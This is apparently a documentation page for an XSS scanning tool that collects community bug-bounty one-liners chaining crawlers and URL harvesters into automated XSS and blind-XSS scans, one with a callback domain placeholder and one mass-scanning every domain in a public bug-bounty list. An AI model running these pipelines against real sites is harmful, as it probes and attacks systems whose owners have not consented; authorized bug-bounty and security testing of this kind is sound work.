---
title: One-Liner
redirect_from: /docs/tips/oneliner/
nav_order: 2
toc: true
layout: page
---

# Community One-Liners

* Scanning XSS from host / from [@cihanmehmet in awesome-oneliner-bugbounty](https://github.com/dwisiswant0/awesome-oneliner-bugbounty)
```bash
gospider -S targets_urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | xssfox pipe | tee result.txt
```
* [Automating XSS using XSSFox, GF and Waybackurls](https://medium.com/bugbountywriteup/automating-xss-using-xssfox-gf-and-waybackurls-bc6de16a5c75)
```bash
cat test.txt | gf xss | sed ‘s/=.*/=/’ | sed ‘s/URL: //’ | tee testxss.txt ; xssfox file testxss.txt -b yours-xss-hunter-domain(e.g yours.xss.ht)
```
* [Find XSS and Blind XSS, and send every request to burpsuite for more manual testing
](https://twitter.com/Alra3ees/status/1407058456323014659)
```bash
xssfox file hosts --mining-dom  --deep-domxss --ignore-return -b 'YOURS.xss.ht' --follow-redirects --proxy http://127.0.0.1:8080
```
* [xssfox scan to bugbounty targets / from KingOfBugBountyTips](https://github.com/KingOfBugbounty/KingOfBugBountyTips#xssfox-scan-to-bugbounty-targets-1)
```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | anew | httpx -silent -threads 500 | xargs -I@ xssfox url @
```
* [Recon subdomains and gau to search vuls XSSFox / from KingOfBugBountyTips](https://github.com/KingOfBugbounty/KingOfBugBountyTips#recon-subdomains-and-gau-to-search-vuls-xssfox)
```bash
assetfinder testphp.vulnweb.com | gau |  xssfox pipe
```
